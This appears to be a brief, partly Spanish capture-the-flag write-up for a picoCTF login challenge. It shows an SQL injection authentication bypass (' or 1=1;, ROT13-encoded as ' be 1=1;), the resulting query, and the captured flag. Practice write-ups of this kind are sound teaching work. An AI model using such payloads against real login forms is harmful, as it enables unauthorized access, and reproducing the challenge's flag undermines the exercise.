# Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
# Solución
```
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
# Notas
- Al enviar la contraseña, el administrador rota 13 veces los caracteres, entonces, para poder acceder agregamos al cyberchef la cadena ==' or 1=1;==, lo rota 13 veces y el resultado es ==' be 1=1;==, al enviarlo como contraseña podemos acceder a la bandera.
# Referencia